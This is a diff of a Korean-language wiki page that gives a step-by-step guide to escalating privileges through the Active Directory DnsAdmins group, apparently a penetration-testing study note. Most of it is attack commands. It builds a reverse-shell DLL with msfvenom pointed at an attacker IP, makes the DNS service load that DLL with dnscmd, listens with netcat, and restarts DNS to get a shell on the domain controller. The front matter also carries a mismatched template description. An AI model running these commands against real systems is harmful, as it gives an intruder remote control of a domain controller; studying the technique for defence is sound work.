@@ -1,3 +1,14 @@
+---
+layout: page
+title: DnsAdmins_(Group)
+description: >
+  This chapter covers the basics of content creation with Hydejack.
+hide_description: true
+sitemap: false
+---
+
+0. this unordered seed list will be replaced by toc as unordered list
+{:toc}
 
 
 # DnsAdmins 그룹을 이용한 권한 상승 가이드
@@ -12,7 +23,7 @@ Active Directory 환경에서 `DnsAdmins` 그룹의 구성원은 DNS 서버에 �
 
 - **목표:** 현재 사용자가 `DnsAdmins` 그룹의 멤버인지 확인합니다.
 
-```powershell(title="사용자 그룹 멤버십 확인")
+```powershell
 whoami /groups
 ```
 
@@ -31,7 +42,7 @@ whoami /groups
 #### **1단계: 악성 DLL 생성**
 - `msfvenom`을 사용하여 리버스 셸을 실행하는 악성 DLL 파일을 생성합니다.
 
-```bash(title="공격자: msfvenom으로 악성 DLL 생성")
+```bash
 # -p: 페이로드 지정
 # -f: 출력 포맷 (dll)
 # LHOST, LPORT: 리스너 IP 및 포트
@@ -44,7 +55,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -
 #### **3. DNS 서비스 설정 변경**
 - `dnscmd.exe`를 사용하여 DNS 서비스가 우리가 업로드한 악성 DLL을 로드하도록 설정합니다.
 
-```powershell(title="타겟: 악성 DLL 로드 설정")
+```powershell
 # <DC_Name>: DNS 서버의 호스트명 (예: DC01.corp.local) 없어도 될 듯
 # /config /serverlevelplugindll: 로드할 DLL 경로 지정
 dnscmd.exe <DC_Name> /config /serverlevelplugindll "C:\Temp\revshell.dll"
@@ -53,11 +64,11 @@ dnscmd.exe <DC_Name> /config /serverlevelplugindll "C:\Temp\revshell.dll"
 #### **4. 리스너 실행 및 서비스 재시작**
 - 공격자 머신에서 Netcat 리스너를 실행하고, 타겟 서버의 DNS 서비스를 재시작하여 DLL이 로드되도록 합니다.
 
-```bash(title="공격자: Netcat 리스너")
+```bash
 rlwrap nc -lvnp 443
 ```
 
-```powershell(title="타겟: DNS 서비스 재시작")
+```powershell
 sc stop dns
 sc start dns
 ```
